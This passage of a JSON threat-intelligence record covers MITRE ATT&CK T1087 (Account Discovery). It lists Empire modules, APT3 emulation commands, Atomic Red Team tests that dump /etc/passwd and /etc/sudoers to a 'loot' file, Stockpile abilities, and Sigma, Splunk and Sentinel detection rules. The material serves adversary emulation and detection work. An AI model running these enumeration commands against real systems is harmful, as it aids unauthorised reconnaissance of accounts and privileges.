"powershell/situational_awareness/network/powerview/get_gpo_computer", "powershell/situational_awareness/network/powerview/get_gpo_computer", "powershell/situational_awareness/network/powerview/get_group", "powershell/situational_awareness/network/powerview/get_group", "powershell/situational_awareness/network/powerview/get_group_member", "powershell/situational_awareness/network/powerview/get_group_member", "powershell/situational_awareness/network/powerview/get_localgroup", "powershell/situational_awareness/network/powerview/get_localgroup", "powershell/situational_awareness/network/powerview/get_loggedon", "powershell/situational_awareness/network/powerview/get_loggedon", "powershell/situational_awareness/network/powerview/get_ou", "powershell/situational_awareness/network/powerview/get_ou", "powershell/situational_awareness/network/powerview/get_user", "powershell/situational_awareness/network/powerview/get_user", "powershell/situational_awareness/network/powerview/user_hunter", "powershell/situational_awareness/network/powerview/user_hunter", "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "python/situational_awareness/network/active_directory/dscl_get_groups", "python/situational_awareness/network/active_directory/dscl_get_groups", "python/situational_awareness/network/active_directory/dscl_get_users", "python/situational_awareness/network/active_directory/dscl_get_users", "python/situational_awareness/network/active_directory/get_groupmembers", "python/situational_awareness/network/active_directory/get_groupmembers", "python/situational_awareness/network/active_directory/get_groupmemberships", "python/situational_awareness/network/active_directory/get_groupmemberships", "python/situational_awareness/network/active_directory/get_groups", "python/situational_awareness/network/active_directory/get_groups", "python/situational_awareness/network/active_directory/get_ous", "python/situational_awareness/network/active_directory/get_ous", "python/situational_awareness/network/active_directory/get_userinformation", "python/situational_awareness/network/active_directory/get_userinformation", "python/situational_awareness/network/active_directory/get_users", "python/situational_awareness/network/active_directory/get_users", "Atomic Test #1 - Enumerate all accounts", "cat /etc/passwd > #{output_file}", "Atomic Test #2 - View sudoers access", "cat /etc/sudoers > #{output_file}", "Atomic Test #3 - View accounts with UID 0", "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username", "lsof $USER", "Atomic Test #4 - Show if a user account has ever logger in remotely", "lastlog > #{output_file}", "Atomic Test #5 - Enumerate users and groups", "groups", "id"], "technique_id": "T1087", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1087", "Built-in Windows Command": "net user [username] [/domain]", "Cobalt Strike": "shell net user [username] [/domain]", "Description": "Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.", "Metasploit": "post/windows/gather/enum_ad_users\nauxiliary/scanner/smb/smb_enumusers"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1087", "Built-in Windows Command": "dsquery group \"ou=Domain Admins,dc=domain,dc=com\"\ndsquery user \"dc=domain,dc=com\"\ndsquery * OU=\"Domain Admins\",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description\ndsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\ndsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "Cobalt Strike": "shell dsquery group \"out=Domain Admins\",dc=domain,dc=com\"\nshell dsquery user \"dc=domain,dc=com\"\nshell dsquery * OU=\"Domain Admins\",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description\nshell dsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\nshell dsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "Description": "Dsquery is a Windows utility on servers that facilitates querying the Active Directory of the domain for lots of information about users, groups, and permissions. When constructing dsquery commands, if your domain is \"subdomain.domain.tld\", then your query will include \"dc=subdomain,dc=domain,dc=tld\"", "Metasploit": ""}}, {"Atomic Red Team Test - Account Discovery": {"display_name": "Account Discovery", "atomic_tests": [{"description": "Enumerate all accounts by copying /etc/passwd to another file\n", "supported_platforms": ["linux", "macos"], "name": "Enumerate all accounts", "input_arguments": {"output_file": {"default": "~/loot.txt", "type": "Path", "description": "Path where captured results will be placed"}}, "executor": {"command": "cat /etc/passwd > #{output_file}\n", "name": "sh"}}, {"description": "(requires root)\n", "supported_platforms": ["linux", "macos"], "name": "View sudoers access", "input_arguments": {"output_file": {"default": "~/loot.txt", "type": "Path", "description": "Path where captured results will be placed"}}, "executor": {"command": "cat /etc/sudoers > #{output_file}\n", "name": "sh"}}, {"description": "View accounts wtih UID 0\n", "supported_platforms": ["linux", "macos"], "name": "View accounts with UID 0", "input_arguments": {"output_file": {"default": "~/loot.txt", "type": "Path", "description": "Path where captured results will be placed"}}, "executor": {"command": "grep 'x:0:' /etc/passwd > #{output_file}\n", "name": "sh"}}, {"description": "List opened files by user\n", "supported_platforms": ["linux", "macos"], "name": "List opened files by user", "executor": {"command": "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username\n", "name": "sh"}}, {"description": "Show if a user account has ever logged in remotely\n", "supported_platforms": ["linux", "macos"], "name": "Show if a user account has ever logged in remotely", "input_arguments": {"output_file": {"default": "~/loot.txt", "type": "Path", "description": "Path where captured results will be placed"}}, "executor": {"command": "lastlog > #{output_file}\n", "name": "sh"}}, {"description": "Utilize groups and id to enumerate users and groups\n", "supported_platforms": ["linux", "macos"], "name": "Enumerate users and groups", "executor": {"command": "groups\nid\n", "name": "sh"}}, {"description": "Utilize local utilities to enumerate users and groups\n", "supported_platforms": ["macos"], "name": "Enumerate users and groups", "executor": {"command": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n", "name": "sh"}}, {"description": "Enumerate all accounts\n", "supported_platforms": ["windows"], "name": "Enumerate all accounts", "executor": {"elevation_required": false, "command": "net user\nnet user /domain\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n", "name": "command_prompt"}}, {"description": "Enumerate all accounts via PowerShell\n", "supported_platforms": ["windows"], "name": "Enumerate all accounts via PowerShell", "executor": {"elevation_required": false, "command": "net user\nnet user /domain\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-aduser -filter *\nget-localgroup\nnet localgroup\n", "name": "powershell"}}, {"description": "Enumerate logged on users\n", "supported_platforms": ["windows"], "name": "Enumerate logged on users", "executor": {"elevation_required": false, "command": "query user\n", "name": "command_prompt"}}, {"description": "Enumerate logged on users via PowerShell\n", "supported_platforms": ["windows"], "name": "Enumerate logged on users via PowerShell", "executor": {"elevation_required": false, "command": "query user\n", "name": "powershell"}}], "attack_technique": "T1087"}}, {"Mitre Stockpile - The net utility is executed via cmd to enumerate detailed information about a specific user account.": {"platforms": {"windows": {"cmd": {"command": "net user #{domain.user.name} /domain\n"}}}, "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.", "tactic": "discovery", "technique": {"attack_id": "T1087", "name": "Account Discovery"}, "id": "364ea817-bbb9-4083-87dd-94b9dba45f6f", "name": "Account Discovery (targeted)"}}, {"Mitre Stockpile - Get a list of all local users": {"platforms": {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"}}}, "description": "Get a list of all local users", "tactic": "discovery", "technique": {"attack_id": "T1087", "name": "Account Discovery"}, "id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48", "name": "Find local users"}}, {"Mitre Stockpile - The net utility is executed via cmd to enumerate domain user accounts.": {"platforms": {"windows": {"cmd": {"command": "net user /domain"}}}, "description": "The net utility is executed via cmd to enumerate domain user accounts.", "tactic": "discovery", "technique": {"attack_id": "T1087", "name": "Account Discovery"}, "id": "c7ec57cd-933e-42b6-99a4-e852a9e57a33", "name": "Account Discovery (all)"}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "Net.exe", "itw_sample": "", "chain_id": "100137", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "localgroup \"administrators\"", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "Net.exe", "itw_sample": "", "chain_id": "100138", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "group \"domain admins\" /domain", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "Net.exe", "itw_sample": "", "chain_id": "100139", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "user * /domain", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100140", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "useraccount get /ALL", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100141", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "useraccount list", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100142", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "qfe get description,installedOn /format:csv", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100143", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "process get caption,executablepath,commandline", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100144", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "service get name,displayname,pathname,startmode", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100145", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "share list", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100146", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "rare", "commandline_string": "/node:\"192.168.0.1\" service where (caption like \"%sql server (%\")", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100147", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "high", "commandline_string": "get-wmiobject -class \"win32_share\" -namespace \"root\\CIMV2\" -computer \"targetname\"", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1087", "file_value": "", "file_path": "", "parent_process": "nltest.exe", "itw_sample": "https://www.hybrid-analysis.com/sample/43bc3efd795f4a1e84f9017f6b39ab331614665b4998e6c806dc8d0417ec314f?environmentId=100", "chain_id": "100215", "registry_value": "", "mitre_caption": "account_discovery", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/management/get_domain_sid", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/get_domain_sid\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/management/sid_to_user", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/sid_to_user\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/management/user_to_sid", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/user_to_sid\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/get_spn", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/get_spn\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/find_foreign_group", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_foreign_group\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/find_foreign_user", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_foreign_user\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_gpo_computer_admin\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/find_gpo_location", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_gpo_location\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/find_localadmin_access", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_localadmin_access\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/find_managed_security_group", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_managed_security_group\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/get_gpo_computer", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_gpo_computer\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/get_group", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_group\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/get_group_member", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_group_member\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/get_localgroup", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_localgroup\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/get_loggedon", "Technique": "Account Discovery", "ATT&CK Technique #2": "T1033", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_loggedon\":  [\"T1087\",\"T1033\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/get_ou", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_ou\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/get_user", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_user\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "powershell/situational_awareness/network/powerview/user_hunter", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/user_hunter\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/dscl_get_groupmembers\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/dscl_get_groups", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/dscl_get_groups\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/dscl_get_users", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/dscl_get_users\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/get_groupmembers", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_groupmembers\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/get_groupmemberships", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_groupmemberships\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/get_groups", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_groups\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/get_ous", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_ous\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/get_userinformation", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_userinformation\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1087", "Empire Module": "python/situational_awareness/network/active_directory/get_users", "Technique": "Account Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_users\":  [\"T1087\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"or process_path contains \"powershell.exe\")and (process_command_line contains \"*net* user*\"or process_command_line contains \"*net* group*\"or process_command_line contains \"*net* localgroup*\"or process_command_line contains \"cmdkey*\\\\/list*\"or process_command_line contains \"*get-localuser*\"or process_command_line contains \"*get-localgroupmembers*\"or process_command_line contains \"*get-aduser*\"or process_command_line contains \"query*user*\")", "product": "Azure Sentinel", "name": "Account Discovery"}, {"query": "title: AD Privileged Users or Groups Reconnaissance\nid: 35ba1d85-724d-42a3-889f-2e2362bcaf23\ndescription: Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs\nreferences:\n    - https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html\ntags:\n    - attack.discovery\n    - attack.t1087\nstatus: experimental\nauthor: Samir Bousseaden\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: enable Object Access SAM on your Domain Controllers'\ndetection:\n    selection:\n        EventID: 4661\n        ObjectType:\n        - 'SAM_USER'\n        - 'SAM_GROUP'\n        ObjectName:\n         - '*-512'\n         - '*-502'\n         - '*-500'\n         - '*-505'\n         - '*-519'\n         - '*-520'\n         - '*-544'\n         - '*-551'\n         - '*-555'\n         - '*admin*'\n    condition: selection\nfalsepositives:\n    - if source account name is not an admin then its super suspicious\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: AD Privileged Users or Groups Reconnaissance\nid: 35ba1d85-724d-42a3-889f-2e2362bcaf23\ndescription: Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs\nreferences:\n    - https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html\ntags:\n    - attack.discovery\n    - attack.t1087\nstatus: experimental\nauthor: Samir Bousseaden\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: enable Object Access SAM on your Domain Controllers'\ndetection:\n    selection:\n        EventID: 4661\n        ObjectType:\n        - 'SAM_USER'\n        - 'SAM_GROUP'\n        ObjectName:\n         - '*-512'\n         - '*-502'\n         - '*-500'\n         - '*-505'\n         - '*-519'\n         - '*-520'\n         - '*-544'\n         - '*-551'\n         - '*-555'\n         - '*admin*'\n    condition: selection\nfalsepositives:\n    - if source account name is not an admin then its super suspicious\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4661\" AND ObjectType:(\"SAM_USER\" OR \"SAM_GROUP\") AND ObjectName.keyword:(*\\\\-512 OR *\\\\-502 OR *\\\\-500 OR *\\\\-505 OR *\\\\-519 OR *\\\\-520 OR *\\\\-544 OR *\\\\-551 OR *\\\\-555 OR *admin*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/AD-Privileged-Users-or-Groups-Reconnaissance <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"AD Privileged Users or Groups Reconnaissance\",\\n    \"description\": \"Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1087\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4661\\\\\" AND ObjectType:(\\\\\"SAM_USER\\\\\" OR \\\\\"SAM_GROUP\\\\\") AND ObjectName.keyword:(*\\\\\\\\-512 OR *\\\\\\\\-502 OR *\\\\\\\\-500 OR *\\\\\\\\-505 OR *\\\\\\\\-519 OR *\\\\\\\\-520 OR *\\\\\\\\-544 OR *\\\\\\\\-551 OR *\\\\\\\\-555 OR *admin*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4661\\\\\" AND ObjectType:(\\\\\"SAM_USER\\\\\" OR \\\\\"SAM_GROUP\\\\\") AND ObjectName.keyword:(*\\\\\\\\-512 OR *\\\\\\\\-502 OR *\\\\\\\\-500 OR *\\\\\\\\-505 OR *\\\\\\\\-519 OR *\\\\\\\\-520 OR *\\\\\\\\-544 OR *\\\\\\\\-551 OR *\\\\\\\\-555 OR *admin*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'AD Privileged Users or Groups Reconnaissance\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4661\" AND ObjectType:(\"SAM_USER\" \"SAM_GROUP\") AND ObjectName.keyword:(*\\\\-512 *\\\\-502 *\\\\-500 *\\\\-505 *\\\\-519 *\\\\-520 *\\\\-544 *\\\\-551 *\\\\-555 *admin*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4661\" (ObjectType=\"SAM_USER\" OR ObjectType=\"SAM_GROUP\") (ObjectName=\"*-512\" OR ObjectName=\"*-502\" OR ObjectName=\"*-500\" OR ObjectName=\"*-505\" OR ObjectName=\"*-519\" OR ObjectName=\"*-520\" OR ObjectName=\"*-544\" OR ObjectName=\"*-551\" OR ObjectName=\"*-555\" OR ObjectName=\"*admin*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4661\" ObjectType IN [\"SAM_USER\", \"SAM_GROUP\"] ObjectName IN [\"*-512\", \"*-502\", \"*-500\", \"*-505\", \"*-519\", \"*-520\", \"*-544\", \"*-551\", \"*-555\", \"*admin*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4661)(?=.*(?:.*SAM_USER|.*SAM_GROUP))(?=.*(?:.*.*-512|.*.*-502|.*.*-500|.*.*-505|.*.*-519|.*.*-520|.*.*-544|.*.*-551|.*.*-555|.*.*admin.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Local Accounts Discovery\nid: 502b42de-4306-40b4-9596-6f590c81f073\nstatus: experimental\ndescription: Local accounts, System Owner/User discovery using operating systems utilities\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n      - Image|endswith: '\\whoami.exe'\n      - Image|endswith: '\\wmic.exe'\n        CommandLine|contains|all:\n            - 'useraccount'\n            - 'get'\n      - Image|endswith: \n            - '\\quser.exe'\n            - '\\qwinsta.exe'\n      - Image|endswith: '\\cmdkey.exe'\n        CommandLine|contains: '/list'\n      - Image|endswith: '\\cmd.exe'\n        CommandLine|contains|all: \n            - '/c'\n            - 'dir'\n            - '\\Users\\'\n    selection_2:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'user'\n    filter:\n        CommandLine|contains:\n            - '/domain'       # local account discovery only\n            - '/add'          # discovery only\n            - '/delete'       # discovery only\n            - '/active'       # discovery only\n            - '/expires'      # discovery only\n            - '/passwordreq'  # discovery only\n            - '/scriptpath'   # discovery only\n            - '/times'        # discovery only\n            - '/workstations' # discovery only\n    condition: selection_1 or ( selection_2 and not filter )\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nfalsepositives:\n     - Legitimate administrator or user enumerates local users for legitimate reason\nlevel: low\ntags:\n    - attack.discovery\n    - attack.t1033\n    - attack.t1087", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Local Accounts Discovery\nid: 502b42de-4306-40b4-9596-6f590c81f073\nstatus: experimental\ndescription: Local accounts, System Owner/User discovery using operating systems utilities\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n      - Image|endswith: '\\whoami.exe'\n      - Image|endswith: '\\wmic.exe'\n        CommandLine|contains|all:\n            - 'useraccount'\n            - 'get'\n      - 